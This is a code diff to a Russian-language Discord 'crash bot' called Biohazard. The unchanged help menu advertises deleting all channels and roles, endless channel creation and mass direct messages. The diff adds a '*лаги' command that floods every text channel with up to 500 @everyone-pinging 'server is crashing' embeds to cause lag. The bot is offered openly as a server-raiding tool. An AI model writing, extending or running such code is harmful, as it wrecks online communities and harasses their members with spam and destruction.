@@ -7,7 +7,7 @@ print('Ожидание входа...')
 class MyClient(discord.Client):
 	async def on_ready(self):
 		print('Вошёл как', self.user)
-		await client.change_presence(activity = discord.Game('Крутой бот | v2.2'))
+		await client.change_presence(activity = discord.Game('Крутой бот | v2.3'))
 		
 	async def on_message(self, message):
 		c = 0
@@ -24,6 +24,7 @@ class MyClient(discord.Client):
 			embed.add_field(name='*канал-', value='Удалить текущий канал', inline=False)
 			embed.add_field(name='*каналы-', value='Удалить все каналы', inline=False)
 			embed.add_field(name='*каналы+', value='Бесконечное создание каналов', inline=False)
+			embed.add_field(name='*лаги', value='Чудовищный спам, вызывает лаги', inline=False)
 			embed.add_field(name='*лс', value='Рассылка всем участникам в ЛС', inline=False)
 			embed.add_field(name='*переименовать', value='Перименовать сервер', inline=False)
 			embed.add_field(name='*роли-', value='Удалить все роли', inline=False)
@@ -209,6 +210,26 @@ class MyClient(discord.Client):
 				await message.delete()
 				for i in message.guild.members:
 					await i.send('Внимание, сервер {0.guild.name} крашится. С любовью, :biohazard: Biohazard :heart: Группа ВК бота: https://vk.com/biohazardbot Discord сервер бота: https://discord.gg/Aw3SgrC'.format(message))
+					
+			if message.content == '*лаги': #лаги
+				await message.delete()
+				
+				embed = discord.Embed(title=":biohazard: КРАШ!!!", description="", color=0x00cc00)
+				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
+				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
+				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
+				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
+				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
+				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
+				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
+				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
+				embed.add_field(name=':biohazard: :biohazard: :biohazard: :biohazard: :biohazard:', value='Внимание, сервер крашится.', inline=False)
+				while s < 500:
+					for i in message.guild.text_channels:
+						await i.send('@everyone', embed=embed)
+						s += 1
+					
+			
 					
 
 client = MyClient()
